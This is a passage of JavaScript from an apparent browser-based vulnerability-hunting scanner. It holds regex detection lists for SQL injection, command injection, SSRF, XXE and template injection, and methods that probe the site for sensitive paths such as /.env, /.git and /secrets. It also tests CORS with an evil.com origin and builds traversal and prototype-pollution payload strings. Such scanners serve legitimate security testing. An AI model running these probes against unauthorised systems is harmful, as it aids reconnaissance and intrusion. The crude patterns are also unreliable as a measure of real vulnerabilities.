    hasSQLInjectionPattern(code) {
      const sqlPatterns = [
  /SELECT.*FROM.*WHERE/i,
  /INSERT.*INTO/i,
  /UPDATE.*SET/i,
  /DELETE.*FROM/i,
  /UNION.*SELECT/i,
  /OR.*=.*OR/i,
  /'.*OR.*'/i,
  /".*OR.*"/i,
  /exec\(/i,
  /execute\(/i,

  // New high-confidence additions
  /DROP\s+TABLE/i,                      // Table deletion
  /ALTER\s+TABLE/i,                     // Schema modification
  /CREATE\s+TABLE/i,                    // Table creation
  /CREATE\s+DATABASE/i,                 // Database creation
  /DROP\s+DATABASE/i,                   // Database deletion
  /INFORMATION_SCHEMA/i,                // Metadata enumeration
  /LOAD_FILE\s*\(/i,                     // MySQL file read
  /INTO\s+OUTFILE/i,                     // MySQL file write
  /xp_cmdshell/i,                        // MSSQL OS command execution
  /sp_executesql/i,                      // MSSQL dynamic SQL
  /sysobjects/i,                         // MSSQL system tables
  /pg_sleep\s*\(/i,                      // PostgreSQL time-based injection
  /pg_read_file\s*\(/i,                  // PostgreSQL file read
  /pg_write_file\s*\(/i,                 // PostgreSQL file write
  /UTL_HTTP/i,                           // Oracle HTTP requests
  /UTL_INADDR/i,                         // Oracle DNS/host lookups
  /DBMS_SQL/i,                           // Oracle dynamic SQL
  /DBMS_PIPE/i,                          // Oracle inter-process comms
  /WAITFOR\s+DELAY/i,                    // MSSQL time-based injection
  /BENCHMARK\s*\(/i,                      // MySQL time-based injection
  /SLEEP\s*\(/i,                          // MySQL/PostgreSQL sleep
  /CHAR\s*\(/i,                           // Character-based obfuscation
  /CONCAT\s*\(/i,                         // String concatenation in SQL
  /CAST\s*\(/i,                           // Type casting
  /CONVERT\s*\(/i,                        // Type conversion
  /@@version/i,                           // DB version disclosure
  /@@hostname/i,                          // MSSQL hostname
  /@@datadir/i,                           // MySQL data directory
  /--\s/i,                                // SQL comment
  /#\s/i,                                 // MySQL comment
  /\/\*/i                                 // Block comment
];

      return sqlPatterns.some((pattern) => pattern.test(code));
    }

    // Command Injection detection
    hasCommandInjectionPattern(code) {
      const cmdPatterns = [
  /exec\(/i,
  /system\(/i,
  /shell_exec\(/i,
  /passthru\(/i,
  /popen\(/i,
  /proc_open\(/i,
  /\|.*\|/i,
  /;.*;/i,
  /`.*`/i,
  /\$\(.*\)/i,

  // New high-confidence additions
  /spawn\s*\(/i,                                // Node.js child_process.spawn
  /fork\s*\(/i,                                 // Process forking
  /child_process/gi,                            // Node.js child_process module
  /require\s*\(\s*['"`]child_process['"`]\s*\)/i, // Explicit require of child_process
  /process\.mainModule\.require\s*\(\s*['"`]child_process['"`]\s*\)/i, // Hidden require
  /vm\.runInNewContext\s*\(/i,                  // Node.js VM execution
  /vm\.runInThisContext\s*\(/i,
  /Deno\.run\s*\(/i,                            // Deno command execution
  /Runtime\.getRuntime\(\)\.exec\s*\(/i,        // Java Runtime exec
  /ProcessBuilder\s*\(/i,                       // Java ProcessBuilder
  /groovy\.util\.Eval\.me\s*\(/i,               // Groovy Eval
  /javax\.script\.ScriptEngineManager/i,        // Java ScriptEngine
  /subprocess\.(Popen|call|run|check_output)\s*\(/i, // Python subprocess
  /os\.system\s*\(/i,                           // Python os.system
  /os\.popen\s*\(/i,                            // Python os.popen
  /pty\.spawn\s*\(/i,                           // Python pty.spawn
  /importlib\.import_module\s*\(/i,             // Python dynamic import
  /eval\s*\(/i,                                 // Ruby eval
  /IO\.popen\s*\(/i,                            // Ruby IO.popen
  /Open3\.(popen|capture|pipeline)/i,           // Ruby Open3
  /%x\([^)]*\)/i,                               // Ruby %x() shell execution
  /backticks\s*`[^`]+`/i,                       // Shell backticks in Ruby/JS
  /perl\s+-e/i,                                 // Perl inline execution
  /system\s+['"`][^'"`]+['"`]/i                 // Generic system call
];

      return cmdPatterns.some((pattern) => pattern.test(code));
    }

    // IDOR detection
    hasIDORPattern(code) {
      const idorPatterns = [
  /user.*id/i,
  /account.*id/i,
  /profile.*id/i,
  /order.*id/i,
  /\?id=\d+/i,
  /\/user\/\d+/i,
  /\/account\/\d+/i,
  /\/profile\/\d+/i,

  // New additions
  /customer.*id/i,
  /client.*id/i,
  /member.*id/i,
  /employee.*id/i,
  /staff.*id/i,
  /student.*id/i,
  /teacher.*id/i,
  /admin.*id/i,
  /group.*id/i,
  /team.*id/i,
  /project.*id/i,
  /ticket.*id/i,
  /case.*id/i,
  /invoice.*id/i,
  /payment.*id/i,
  /transaction.*id/i,
  /booking.*id/i,
  /reservation.*id/i,
  /shipment.*id/i,
  /delivery.*id/i,
  /file.*id/i,
  /document.*id/i,
  /record.*id/i,
  /message.*id/i,
  /thread.*id/i,
  /comment.*id/i,
  /post.*id/i,
  /article.*id/i,
  /product.*id/i,
  /item.*id/i,
  /asset.*id/i,
  /resource.*id/i,
  /image.*id/i,
  /photo.*id/i,
  /video.*id/i,
  /media.*id/i,
  /\?user_id=\d+/i,
  /\?account_id=\d+/i,
  /\?profile_id=\d+/i,
  /\?order_id=\d+/i,
  /\?customer_id=\d+/i,
  /\?project_id=\d+/i,
  /\?ticket_id=\d+/i,
  /\?invoice_id=\d+/i,
  /\?transaction_id=\d+/i,
  /\?booking_id=\d+/i,
  /\?reservation_id=\d+/i,
  /\?file_id=\d+/i,
  /\?document_id=\d+/i,
  /\?record_id=\d+/i,
  /\?message_id=\d+/i,
  /\?comment_id=\d+/i,
  /\?post_id=\d+/i,
  /\?product_id=\d+/i,
  /\?item_id=\d+/i,
  /\?asset_id=\d+/i,
  /\?resource_id=\d+/i,
  /\/customer\/\d+/i,
  /\/project\/\d+/i,
  /\/ticket\/\d+/i,
  /\/invoice\/\d+/i,
  /\/transaction\/\d+/i,
  /\/booking\/\d+/i,
  /\/reservation\/\d+/i,
  /\/file\/\d+/i,
  /\/document\/\d+/i,
  /\/record\/\d+/i,
  /\/message\/\d+/i,
  /\/comment\/\d+/i,
  /\/post\/\d+/i,
  /\/product\/\d+/i,
  /\/item\/\d+/i,
  /\/asset\/\d+/i,
  /\/resource\/\d+/i
];

      return idorPatterns.some((pattern) => pattern.test(code));
    }

    // File Inclusion detection
    hasFileInclusionPattern(code) {
      const filePatterns = [
  /\.\./i,
  /include\(/i,
  /require\(/i,
  /file_get_contents\(/i,
  /fopen\(/i,
  /readfile\(/i,
  /\.\.\/\.\.\/\.\./i,
  /\.\.\\.\./i,

  // New high-confidence additions
  /require_once\(/i,                          // PHP require_once
  /include_once\(/i,                          // PHP include_once
  /opendir\(/i,                               // PHP opendir
  /readdir\(/i,                               // PHP readdir
  /scandir\(/i,                               // PHP scandir
  /unlink\(/i,                                // PHP unlink (file delete)
  /copy\(/i,                                  // PHP copy
  /rename\(/i,                                // PHP rename/move
  /move_uploaded_file\(/i,                    // PHP file upload handling
  /is_file\(/i,                               // PHP file check
  /is_dir\(/i,                                // PHP directory check
  /pathinfo\(/i,                              // PHP path info extraction
  /SplFileObject/i,                           // PHP file object
  /java\.io\.File/i,                          // Java File class
  /java\.nio\.file/i,                         // Java NIO file package
  /Files\.readAllBytes/i,                     // Java file read
  /Files\.write/i,                            // Java file write
  /new\s+FileInputStream/i,                   // Java file input stream
  /new\s+FileOutputStream/i,                  // Java file output stream
  /fs\.readFile\s*\(/i,                       // Node.js fs.readFile
  /fs\.readFileSync\s*\(/i,                   // Node.js fs.readFileSync
  /fs\.writeFile\s*\(/i,                      // Node.js fs.writeFile
  /fs\.writeFileSync\s*\(/i,                  // Node.js fs.writeFileSync
  /fs\.createReadStream\s*\(/i,               // Node.js read stream
  /fs\.createWriteStream\s*\(/i,              // Node.js write stream
  /open\s*\(/i,                               // Python open()
  /io\.open\s*\(/i,                           // Python io.open()
  /shutil\.copy/i,                            // Python shutil.copy
  /shutil\.move/i,                            // Python shutil.move
  /os\.remove/i,                              // Python os.remove
  /os\.unlink/i,                              // Python os.unlink
  /os\.rename/i,                              // Python os.rename
  /pathlib\.Path/i,                           // Python pathlib
  /with\s+open\s*\(/i,                        // Python with open()
  /fread\s*\(/i,                              // C fread
  /fwrite\s*\(/i,                             // C fwrite
  /ifstream\s+\w+/i,                          // C++ file input stream
  /ofstream\s+\w+/i,                          // C++ file output stream
  /std::filesystem/i                          // C++17 filesystem API
];

      return filePatterns.some((pattern) => pattern.test(code));
    }

    // SSTI detection
    hasSSTIpattern(code) {
      const sstiPatterns = [
        /\{\{.*\}\}/i,                  // Mustache / Handlebars / Jinja2
        /\$\{.*\}/i,                    // JSP / Thymeleaf / Spring EL
        /<%.*%>/i,                      // JSP / EJS
        /<%=.*%>/i,                     // EJS output
        /render\(/i,                    // Generic render() calls
        /template\(/i,                  // Generic template() calls
        /compile\(/i,                   // Generic compile() calls

        // New high-confidence additions
        /\{\%.*\%\}/i,                  // Jinja2 / Twig / Django
        /\{\#.*\#\}/i,                  // Twig / Jinja2 comments
        /\{\-.*\-\}/i,                  // Nunjucks / Liquid
        /\{\{.*\}\}/i,                  // Liquid / AngularJS double curly
        /\{\{.*\|.*\}\}/i,              // Filters in Jinja2 / Twig
        /\{\{.*\}\}/i,                  // Handlebars / Mustache
      ];

      return sstiPatterns.some((pattern) => pattern.test(code));
    }

    // 🚨 Add vulnerability
    addVulnerability(type, severity, details) {
      // Validate to reduce false positives
      if (!this.validateVulnerability(type, severity, details)) {
        return;
      }

      // Check for duplicates
      const isDuplicate = this.vulnerabilities.some(v =>
        v.type === type &&
        v.details?.endpoint === details?.endpoint &&
        v.details?.pattern === details?.pattern
      );

      if (isDuplicate) {
        return; // Skip duplicate
      }

      this.vulnerabilities.push({
        type: type,
        severity: severity,
        details: details,
        timestamp: Date.now(),
      });
    }

    // 📊 Generate comprehensive report
    generateReport() {
      console.log(
        "%c📊 GENERATING HUNTING REPORT...",
        "color: gold; font-weight: bold;"
      );

      const report = {
        summary: {
          totalEndpoints: this.discoveredEndpoints.size,
          highRiskEndpoints: this.getHighRiskCount(),
          vulnerabilities: this.vulnerabilities.length,
          categories: this.attackSurface.size,
          overallRisk: this.calculateOverallRisk(),
        },
        topTargets: this.getTopTargets(),
        criticalFindings: this.getCriticalFindings(),
        recommendations: this.getRecommendations(),
      };

      this.displayReport(report);
      return report;
    }

    // 📈 Display report
    displayReport(report) {
      console.log("\n" + "=".repeat(60));
      console.log("🔥💀 CRITICAL FLAW HUNTING REPORT 💀🔥");
      console.log("=".repeat(60));

      console.log("\n📊 SUMMARY:");
      console.log(`  Total Endpoints: ${report.summary.totalEndpoints}`);
      console.log(`  High Risk Endpoints: ${report.summary.highRiskEndpoints}`);
      console.log(`  Vulnerabilities Found: ${report.summary.vulnerabilities}`);
      console.log(`  Overall Risk: ${report.summary.overallRisk}`);

      console.log("\n🎯 TOP TARGETS:");
      report.topTargets.forEach((target, i) => {
        console.log(
          `  ${i + 1}. ${target.url} (Score: ${target.riskScore.toFixed(1)})`
        );
      });

      console.log("\n🚨 CRITICAL FINDINGS:");
      report.criticalFindings.forEach((finding) => {
        const description = finding.details?.description || finding.details?.pattern || "No description available";
        console.log(`  ⚠️  ${finding.type}: ${description}`);
      });

      console.log("\n💡 RECOMMENDATIONS:");
      report.recommendations.forEach((rec, i) => {
        console.log(`  ${i + 1}. ${rec}`);
      });

      console.log("\n" + "=".repeat(60));
      console.log("🔥 Happy Hunting! 🔥");
    }

    // 🎯 Get top targets
    getTopTargets() {
      const allEndpoints = Array.from(this.discoveredEndpoints.values());
      return allEndpoints
        .filter((e) => e.riskScore > 0)
        .sort((a, b) => b.riskScore - a.riskScore)
        .slice(0, 10);
    }

    // 🚨 Get critical findings
    getCriticalFindings() {
      return this.vulnerabilities.filter(
        (v) => v.severity === "CRITICAL" || v.severity === "HIGH"
      );
    }

    // 💡 Get recommendations
    getRecommendations() {
      const recommendations = [];

      if (this.vulnerabilities.some((v) => v.type === "XSS")) {
        recommendations.push(
          "Implement input sanitization and output encoding"
        );
      }

      if (this.vulnerabilities.some((v) => v.type === "CSRF")) {
        recommendations.push(
          "Add CSRF tokens to all state-changing operations"
        );
      }

      const authEndpoints = this.attackSurface.get("AUTHENTICATION") || [];
      if (authEndpoints.length > 5) {
        recommendations.push(
          "Review authentication endpoints for bypass opportunities"
        );
      }

      if (this.getHighRiskCount() > 10) {
        recommendations.push("Prioritize testing high-risk endpoints first");
      }

      recommendations.push("Test for IDOR on all access control endpoints");
      recommendations.push("Check business logic flaws in transaction flows");

      return recommendations;
    }

    // 📊 Helper methods
    getHighRiskCount() {
      return Array.from(this.discoveredEndpoints.values()).filter(
        (e) => e.riskScore >= 50
      ).length;
    }

    calculateOverallRisk() {
      const scores = Array.from(this.discoveredEndpoints.values()).map(
        (e) => e.riskScore
      );
      const avgScore = scores.reduce((a, b) => a + b, 0) / scores.length;

      if (avgScore >= 70) return "CRITICAL";
      if (avgScore >= 50) return "HIGH";
      if (avgScore >= 30) return "MEDIUM";
      return "LOW";
    }

    getRiskEmoji(level) {
      const emojis = {
        CRITICAL: "🔥",
        HIGH: "⚠️",
        MEDIUM: "⚡",
        LOW: "ℹ️",
      };
      return emojis[level] || "❓";
    }

    groupBy(array, key) {
      return array.reduce((groups, item) => {
        const group = item[key];
        groups[group] = groups[group] || [];
        groups[group].push(item);
        return groups;
      }, {});
    }

    // 🎯 Get final results
    getResults() {
      return {
        endpoints: Array.from(this.discoveredEndpoints.values()),
        attackSurface: Object.fromEntries(this.attackSurface),
        vulnerabilities: this.vulnerabilities,
        summary: {
          totalEndpoints: this.discoveredEndpoints.size,
          highRiskEndpoints: this.getHighRiskCount(),
          overallRisk: this.calculateOverallRisk(),
        },
      };
    }

    // 🔧 Advanced hunting methods
    async deepScan() {
      console.log(
        "%c🔍 STARTING DEEP SCAN...",
        "color: red; font-weight: bold;"
      );

      try {
        // Phase 1: Basic scans
        console.log("📊 Phase 1: Basic vulnerability scans...");
        await Promise.allSettled([
          this.scanForHiddenEndpoints(),
          this.testParameterPollution(),
          this.checkForDebugEndpoints()
        ]);

        // Phase 2: Advanced scans
        console.log("🔬 Phase 2: Advanced vulnerability scans...");
        await Promise.allSettled([
          this.analyzeCORSMisconfigurations(),
          this.testForClickjacking(),
          this.scanForSSRF(),
          this.scanForXXE(),
          this.scanForRCE()
        ]);

        console.log("✅ Deep scan complete");
      } catch (error) {
        console.log("❌ Deep scan encountered errors:", error.message);
        console.log("🔄 Continuing with available results...");
      }
    }

    // 🕵️ Scan for hidden endpoints
    async scanForHiddenEndpoints() {
      const commonPaths = [
  "/admin",
  "/api",
  "/test",
  "/dev",
  "/debug",
  "/config",
  "/backup",
  "/old",
  "/temp",
  "/private",
  "/internal",
  "/v1",
  "/v2",
  "/api/v1",
  "/api/v2",
  "/graphql",
  "/.git",
  "/.env",
  "/swagger",
  "/docs",
  "/phpinfo",

  // New additions
  "/adminer.php",
  "/administrator",
  "/backend",
  "/dashboard",
  "/manage",
  "/management",
  "/monitor",
  "/monitoring",
  "/system",
  "/server-status",
  "/server-info",
  "/status",
  "/health",
  "/metrics",
  "/actuator",
  "/console",
  "/h2-console",
  "/jmx-console",
  "/web-console",
  "/shell",
  "/terminal",
  "/repl",
  "/explorer",
  "/explore",
  "/whoami",
  "/version",
  "/build-info",
  "/git-info",
  "/v2/api-docs",
  "/openapi",
  "/api-docs",
  "/apidocs",
  "/playground",
  "/graphiql",
  "/login",
  "/signin",
  "/signup",
  "/register",
  "/user",
  "/users",
  "/account",
  "/profile",
  "/settings",
  "/preferences",
  "/config.json",
  "/config.yaml",
  "/config.yml",
  "/database",
  "/db",
  "/sql",
  "/dump",
  "/data",
  "/dataset",
  "/storage",
  "/uploads",
  "/upload",
  "/files",
  "/file",
  "/download",
  "/downloads",
  "/export",
  "/import",
  "/logs",
  "/log",
  "/logging",
  "/error",
  "/errors",
  "/crash",
  "/heapdump",
  "/threaddump",
  "/env",
  "/environment",
  "/secrets",
  "/secret",
  "/keys",
  "/key",
  "/token",
  "/tokens",
  "/auth",
  "/authentication",
  "/authorize",
  "/callback",
  "/oauth",
  "/oauth2",
  "/sso",
  "/session",
  "/sessions"
];

      console.log("🕵️ Scanning for hidden endpoints...");

      const results = [];
      const batchSize = 3; // Process in smaller batches
      const delay = 200; // Increased delay for heavy applications

      for (let i = 0; i < commonPaths.length; i += batchSize) {
        const batch = commonPaths.slice(i, i + batchSize);

        const batchPromises = batch.map(async (path) => {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout

            const response = await fetch(path, {
              method: "HEAD",
              signal: controller.signal
            });

            clearTimeout(timeoutId);

            if (response.status !== 404 && response.status < 500) {
              this.addEndpoint(path, "HIDDEN_SCAN", {
                status: response.status,
                type: "hidden-endpoint",
              });
              console.log(`🎯 Found: ${path} (${response.status})`);
              results.push({ path, status: response.status, found: true });
            } else {
              results.push({ path, status: response.status, found: false });
            }
          } catch (e) {
            if (e.name === 'AbortError') {
              console.log(`⏰ Timeout: ${path}`);
            } else {
              console.log(`❌ Error scanning ${path}: ${e.message}`);
            }
            results.push({ path, error: e.message, found: false });
          }
        });

        await Promise.all(batchPromises);

        // Delay between batches
        if (i + batchSize < commonPaths.length) {
          await new Promise((resolve) => setTimeout(resolve, delay));
        }
      }

      const foundCount = results.filter(r => r.found).length;
      console.log(`📊 Hidden endpoint scan complete: ${foundCount}/${commonPaths.length} potential endpoints found`);
    }

    // 🧪 Test parameter pollution
    async testParameterPollution() {
      console.log("🧪 Testing parameter pollution...");

      const testCases = [
        // Duplicate keys
        "?param=value1&param=value2",
        "?param=value1;param=value2", // semicolon separator
        "?param=value1,param=value2", // comma separator

        // Array notation
        "?param[]=value1&param[]=value2",
        "?param[0]=value1&param[1]=value2",
        "?param[foo]=value1&param[bar]=value2",

        // Dot notation
        "?param.a=value1&param.b=value2",
        "?param.inner.key=value",

        // Mixed styles
        "?param=value1&param[]=value2",
        "?param=value1&param[extra]=value2",
        "?param=value1&param.a=value2",

  // Empty values
  "?param=",
  "?param&param2=",
  "?param=&param2=value",

  // Encoded keys/values
  "?%70aram=value", // 'p' encoded
  "?param=%76alue", // 'v' encoded
  "?param%5B%5D=value1&param%5B%5D=value2", // [] encoded

  // Special characters in keys
  "?param-value=value",
  "?param.value=value",
  "?param/value=value",
  "?param\\value=value",

  // Null byte injection
  "?param=value%00evil",
  "?param%00evil=value",

  // Overlong UTF-8
  "?param=%C0%AE%C0%AE%2Fetc%2Fpasswd",

  // JSON-like
  "?param={\"a\":1}",
  "?param=%7B%22a%22%3A1%7D", // encoded JSON

  // Prototype pollution attempts
  "?__proto__[polluted]=true",
  "?constructor[prototype][polluted]=true",
  "?param[__proto__][polluted]=true"
];

      // Test on discovered endpoints
      const endpoints = Array.from(this.discoveredEndpoints.keys()).slice(0, 5);

      for (const endpoint of endpoints) {
        for (const testCase of testCases) {
          const testUrl = endpoint + testCase;
          this.addVulnerability("PARAMETER_POLLUTION", "MEDIUM", {
            endpoint: testUrl,
            description: "Potential parameter pollution vector",
          });
        }
      }
    }

    // 🐛 Check for debug endpoints
    async checkForDebugEndpoints() {
      console.log("🐛 Checking debug endpoints...");

      const debugPaths = [
  "/debug",
  "/trace",
  "/info",
  "/status",
  "/health",
  "/metrics",
  "/actuator",
  "/console",
  "/phpinfo.php",

  // New additions
  "/admin",
  "/adminer.php",
  "/administrator",
  "/backend",
  "/dashboard",
  "/manage",
  "/management",
  "/monitor",
  "/monitoring",
  "/system",
  "/server-status",
  "/server-info",
  "/jmx-console",
  "/web-console",
  "/h2-console",
  "/dev",
  "/development",
  "/test",
  "/testing",
  "/staging",
  "/qa",
  "/logs",
  "/log",
  "/logging",
  "/error",
  "/errors",
  "/dump",
  "/heapdump",
  "/threaddump",
  "/env",
  "/environment",
  "/config",
  "/configuration",
  "/settings",
  "/swagger",
  "/swagger-ui",
  "/api-docs",
  "/apidocs",
  "/openapi",
  "/graphiql",
  "/playground",
  "/shell",
  "/terminal",
  "/repl",
  "/explorer",
  "/explore",
  "/whoami",
  "/version",
  "/build-info",
  "/git-info",
  "/v2/api-docs"
];

      const batchSize = 2;
      const delay = 300;

      for (let i = 0; i < debugPaths.length; i += batchSize) {
        const batch = debugPaths.slice(i, i + batchSize);

        const batchPromises = batch.map(async (path) => {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);

            const response = await fetch(path, { signal: controller.signal });
            clearTimeout(timeoutId);

            if (response.ok) {
              const text = await response.text();
              if (text.length > 1000) {
                // Likely has debug info
                this.addVulnerability("INFO_DISCLOSURE", "MEDIUM", {
                  endpoint: path,
                  description: "Debug endpoint exposing information",
                });
                console.log(`🐛 Found debug endpoint: ${path}`);
              }
            }
          } catch (e) {
            if (e.name !== 'AbortError') {
              console.log(`❌ Error checking ${path}: ${e.message}`);
            }
          }
        });

        await Promise.all(batchPromises);

        // Delay between batches
        if (i + batchSize < debugPaths.length) {
          await new Promise((resolve) => setTimeout(resolve, delay));
        }
      }
    }

    // 🌐 Analyze CORS misconfigurations
    async analyzeCORSMisconfigurations() {
      console.log("🌐 Analyzing CORS configurations...");

      const testOrigins = ["https://evil.com", "http://localhost:3000", "null"];
      const endpoints = Array.from(this.discoveredEndpoints.keys()).slice(0, 5);

      let corsIssuesFound = 0;

      for (const endpoint of endpoints) {
        for (const testOrigin of testOrigins) {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);

            const response = await fetch(endpoint, {
              headers: { Origin: testOrigin },
              signal: controller.signal
            });

            clearTimeout(timeoutId);

            const corsOrigin = response.headers.get("Access-Control-Allow-Origin");
            const corsMethods = response.headers.get("Access-Control-Allow-Methods");
            const corsHeaders = response.headers.get("Access-Control-Allow-Headers");
            const corsCredentials = response.headers.get("Access-Control-Allow-Credentials");

            // Check for misconfigurations
            if (corsOrigin === "*" && corsCredentials === "true") {
              this.addVulnerability("CORS_MISCONFIGURATION", "CRITICAL", {
                endpoint: endpoint,
                corsOrigin: corsOrigin,
                corsCredentials: corsCredentials,
                description: "CORS wildcard with credentials - severe misconfiguration",
              });
              corsIssuesFound++;
            } else if (corsOrigin === "*") {
              this.addVulnerability("CORS_MISCONFIGURATION", "HIGH", {
                endpoint: endpoint,
                corsOrigin: corsOrigin,
                description: "Permissive CORS policy detected",
              });
              corsIssuesFound++;
            } else if (corsOrigin === testOrigin) {
              this.addVulnerability("CORS_MISCONFIGURATION", "MEDIUM", {
                endpoint: endpoint,
                corsOrigin: corsOrigin,
                testOrigin: testOrigin,
                description: "CORS reflects arbitrary origin",
              });
              corsIssuesFound++;
            }

            // Check for overly permissive methods
            if (corsMethods && corsMethods.includes("PUT") && corsMethods.includes("DELETE")) {
              this.addVulnerability("CORS_MISCONFIGURATION", "MEDIUM", {
                endpoint: endpoint,
                corsMethods: corsMethods,
                description: "CORS allows dangerous HTTP methods",
              });
              corsIssuesFound++;
            }

          } catch (e) {
            if (e.name === 'AbortError') {
              console.log(`⏰ CORS test timeout for ${endpoint}`);
            } else if (e.message.includes('CORS')) {
              // This is expected for cross-origin requests
              console.log(`🌐 CORS policy blocks direct testing of ${endpoint} (expected)`);
            } else {
              console.log(`❌ CORS test failed for ${endpoint}: ${e.message}`);
            }
          }
        }
      }

      console.log(`🌐 CORS analysis complete: ${corsIssuesFound} potential issues found`);
    }

    // 🖱️ Test for clickjacking
    async testForClickjacking() {
      console.log("🖱️ Testing clickjacking protection...");

      try {
        const response = await fetch(window.location.href);
        const xFrameOptions = response.headers.get("X-Frame-Options");
        const csp = response.headers.get("Content-Security-Policy");

        const hasFrameProtection =
          xFrameOptions || (csp && csp.includes("frame-ancestors"));

        if (!hasFrameProtection) {
          this.addVulnerability("CLICKJACKING", "MEDIUM", {
            description: "Missing clickjacking protection headers",
          });
        }
      } catch (e) {
        // Skip if can't check headers
      }
    }

    // 🌐 Scan for SSRF vulnerabilities
    async scanForSSRF() {
      console.log("🌐 Scanning for SSRF vulnerabilities...");

      const ssrfPatterns = [
  /url\s*[:=]\s*['"`]?([^'"`\s]+)['"`]?/gi,
  /redirect\s*[:=]\s*['"`]?([^'"`\s]+)['"`]?/gi,
  /proxy\s*[:=]\s*['"`]?([^'"`\s]+)['"`]?/gi,
  /fetch\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,

  // New high-confidence SSRF indicators
  /axios\.(get|post|put|delete|head|patch)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi, // Axios direct calls
  /request\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,                                // request() library
  /superagent\.(get|post|put|delete|head)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi, // Superagent HTTP calls
  /got\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,                                    // got() HTTP client
  /needle\.(get|post|put|delete|head)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,     // Needle HTTP client
  /http[s]?\.(get|request)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,                // Node.js http/https
  /urllib\.(request|curl)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,                 // urllib calls
  /open-uri\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,                               // Ruby open-uri
  /Net::HTTP\.(get|post|start)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,            // Ruby Net::HTTP
  /RestClient\.(get|post|put|delete)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,      // Ruby RestClient
  /curl_exec\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,                              // PHP curl_exec
  /curl_setopt\s*\([^,]+,\s*CURLOPT_URL\s*,\s*['"`]?([^'"`\s]+)['"`]?\)/gi,  // PHP curl_setopt URL
  /file_get_contents\s*\(\s*['"`]?http([^'"`\s]+)['"`]?\)/gi,                // PHP file_get_contents with http
  /urllib\.request\.urlopen\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,               // Python urllib
  /requests\.(get|post|put|delete|head)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi,   // Python requests
  /aiohttp\.ClientSession\(\)\.(get|post|put|delete|head)\s*\(\s*['"`]?([^'"`\s]+)['"`]?/gi, // aiohttp
  /java\.net\.URL\s*\(\s*['"`]?([^'"`\s]+)['"`]?\)/gi,                       // Java URL()
  /HttpClient\.send\s*\([^,]+,\s*HttpRequest\.newBuilder\(\s*['"`]?([^'"`\s]+)['"`]?\)/gi, // Java HttpClient
  /OkHttpClient\.\w+\(\)\.newCall\s*\([^)]*Request\.Builder\(\)\.url\(\s*['"`]?([^'"`\s]+)['"`]?\)/gi // OkHttp
];

      const scripts = Array.from(document.querySelectorAll("script"));
      const jsContent = scripts.map((s) => s.innerHTML).join("\n");

      ssrfPatterns.forEach((pattern) => {
        let match;
        while ((match = pattern.exec(jsContent)) !== null) {
          const url = match[1];
          if (url && (url.startsWith("http") || url.includes("://"))) {
            this.addVulnerability("SSRF", "HIGH", {
              pattern: pattern.source,
              url: url,
              description: "Potential SSRF vector in JavaScript",
            });
          }
        }
      });

      // Check discovered endpoints for URL parameters
      this.discoveredEndpoints.forEach((endpoint) => {
        if (endpoint.url.includes("url=") || endpoint.url.includes("redirect=") || endpoint.url.includes("proxy=")) {
          this.addVulnerability("SSRF", "MEDIUM", {
            endpoint: endpoint.url,
            description: "Endpoint with URL parameter - potential SSRF",
          });
        }
      });
    }

    // 📄 Scan for XXE vulnerabilities
    async scanForXXE() {
      console.log("📄 Scanning for XXE vulnerabilities...");

      const xxePatterns = [
  /XMLHttpRequest|DOMParser|xml/i,
  /<!ENTITY/i,
  /SYSTEM\s+['"`]/i,
  /PUBLIC\s+['"`]/i,

  // New additions
  /<!DOCTYPE/i,                                      // XML DOCTYPE declaration
  /<!ELEMENT/i,                                      // XML element definition
  /<!ATTLIST/i,                                      // XML attribute list definition
  /<!\[CDATA\[/i,                                    // CDATA sections
  /ENTITY\s+%/i,                                     // Parameter entity (XXE payloads)
  /file:\/\//i,                                      // Local file inclusion in XML
  /expect:\/\//i,                                    // PHP expect wrapper in XML
  /gopher:\/\//i,                                    // Gopher protocol in XML
  /ftp:\/\//i,                                       // FTP protocol in XML
  /http:\/\//i,                                      // HTTP protocol in XML
  /https:\/\//i,                                     // HTTPS protocol in XML
  /data:application\/xml/i,                          // Data URI XML
  /data:text\/xml/i,                                 // Data URI XML
  /xml2js|fast-xml-parser|xmldom/i,                   // Node.js XML parsers
  /sax|xml-simple|libxml/i,                           // Common XML libs in multiple langs
  /DocumentBuilderFactory/i,                         // Java XML parser
  /SAXParserFactory/i,                               // Java SAX parser
  /TransformerFactory/i,                             // Java XML transformer
  /XmlReader|XmlDocument|XmlSerializer/i,            // .NET XML classes
  /lxml|xml\.etree|defusedxml/i,                      // Python XML libs
  /simplexml_load_string|simplexml_load_file/i,       // PHP XML functions
  /xml_parse|xml_parser_create/i,                     // PHP XML parser functions
  /javax\.xml\.parsers/i,                             // Java XML parsers package
  /org\.xml\.sax/i,                                   // Java SAX package
  /org\.w3c\.dom/i                                    // Java DOM package
];

      const scripts = Array.from(document.querySelectorAll("script"));
      const jsContent = scripts.map((s) => s.innerHTML).join("\n");

      xxePatterns.forEach((pattern) => {
        if (pattern.test(jsContent)) {
          this.addVulnerability("XXE", "HIGH", {
            pattern: pattern.source,
            description: "Potential XXE vector detected in JavaScript",
          });
        }
      });

      // Check for XML-related endpoints
      this.discoveredEndpoints.forEach((endpoint) => {
        if (endpoint.url.includes("xml") || endpoint.url.includes("parse")) {
          this.addVulnerability("XXE", "MEDIUM", {
            endpoint: endpoint.url,
            description: "XML-related endpoint - potential XXE",
          });
        }
      });
    }

    // 💥 Scan for RCE vulnerabilities
    async scanForRCE() {
      console.log("💥 Scanning for RCE vulnerabilities...");

      const rcePatterns = [
  /eval\s*\(/gi,
  /Function\s*\(/gi,
  /setTimeout\s*\(\s*['"`]/gi,
